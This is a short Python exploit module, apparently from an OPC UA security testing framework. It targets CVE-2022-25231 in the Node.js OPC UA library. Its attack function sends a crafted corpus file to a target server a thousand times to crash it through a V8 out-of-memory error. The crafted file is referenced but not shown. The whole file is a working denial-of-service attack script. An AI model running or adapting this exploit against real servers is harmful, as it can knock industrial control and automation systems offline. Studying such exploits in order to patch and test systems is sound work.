# Crashing NodeJS OPCUA with a corpus sample file - V8 OOM
#
# CVEs:
#   - CVE-2022-25231: https://security.snyk.io/vuln/SNYK-JS-NODEOPCUA-2988724

import time
import os
CURRENT_PATH = os.path.dirname(os.path.abspath(__file__))

from .opcua_message_file import attack_file

# Corpus - shot a single corpus file to a server
#   Crash NodeJS OPCUA with a corpus sample
def attack(server_details):
    for i in range(1000):
        attack_file(server_details, filepath_corpus=os.path.join(CURRENT_PATH, "examples/corpus_nodejs_opcua_crash_v8_oom.bin"), num_requests=1)